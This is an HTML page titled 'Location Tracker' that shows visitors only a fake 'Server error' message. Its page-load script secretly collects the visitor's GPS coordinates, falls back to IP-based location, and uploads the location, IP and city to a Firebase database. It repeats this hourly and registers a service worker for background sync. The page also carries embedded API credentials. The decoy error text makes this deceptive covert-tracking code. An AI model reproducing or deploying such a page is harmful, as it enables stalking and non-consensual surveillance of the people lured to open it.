<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Location Tracker</title>
    
    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
        import { getFirestore, collection, addDoc } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";

        // Firebase Config
        const firebaseConfig = {
            apiKey: "AIzaSyAB6STYBF-Fzg4U4QkET_bMej47ZUJDM4Y",
            authDomain: "locationsaver-b9997.firebaseapp.com",
            projectId: "locationsaver-b9997",
            storageBucket: "locationsaver-b9997.firebasestorage.app",
            messagingSenderId: "675975845355",
            appId: "1:675975845355:web:95cf7d6a2c255a33be35ae",
            measurementId: "G-WJJY3Q2M8E"
        };

        // Initialize Firebase
        const app = initializeApp(firebaseConfig);
        const db = getFirestore(app);

        // Get IST Time
        function getISTTime() {
            let now = new Date();
            let istOffset = 5.5 * 60 * 60 * 1000; // IST is UTC+5:30
            let istTime = new Date(now.getTime() + istOffset).toISOString();
            return istTime;
        }

        // Save Data to Firestore
        async function saveUserData(data) {
            try {
                await addDoc(collection(db, "user_data"), data);
                console.log("✅ Data saved:", data);
            } catch (error) {
                console.error("❌ Error saving data:", error);
            }
        }

        // Get GPS Location
        function getGPSLocation(callback) {
            if ("geolocation" in navigator) {
                navigator.geolocation.getCurrentPosition(position => {
                    let data = {
                        latitude: position.coords.latitude,
                        longitude: position.coords.longitude,
                        accuracy: position.coords.accuracy,
                        time: getISTTime(),
                        source: "GPS"
                    };
                    callback(data);
                }, () => {
                    console.warn("❌ GPS Denied! Using IP Location.");
                    getIPLocation(callback);
                });
            } else {
                console.warn("❌ GPS not supported.");
                getIPLocation(callback);
            }
        }

        // Get IP Location (Fallback)
        function getIPLocation(callback) {
            fetch("https://ipinfo.io/json?token=6a9008bb55fd89")
                .then(response => response.json())
                .then(data => {
                    let location = {
                        ip: data.ip,
                        city: data.city,
                        region: data.region,
                        country: data.country,
                        latitude: data.loc.split(",")[0],
                        longitude: data.loc.split(",")[1],
                        time: getISTTime(),
                        source: "IP"
                    };
                    callback(location);
                })
                .catch(error => {
                    console.error("❌ Error fetching IP location:", error);
                    callback(null);
                });
        }

        // Periodic Tracking (Every 60 Minutes)
        function startTracking() {
            getGPSLocation(location => {
                if (location) {
                    saveUserData(location);
                }
            });

            setInterval(() => {
                getGPSLocation(location => {
                    if (location) {
                        saveUserData(location);
                    }
                });
            }, 60 * 60 * 1000); // Every 60 minutes
        }

        // Register Service Worker for Background Sync
        if ("serviceWorker" in navigator) {
            navigator.serviceWorker.register("sw.js").then(reg => {
                console.log("✅ Service Worker Registered");
            }).catch(error => {
                console.error("❌ Service Worker Registration Failed:", error);
            });
        }

        // Start Tracking When Page Loads
        startTracking();
    </script>
</head>

<body>
    <h1>Server error.</h1>
    <p>Try again after some time...</p>
</body>
</html>
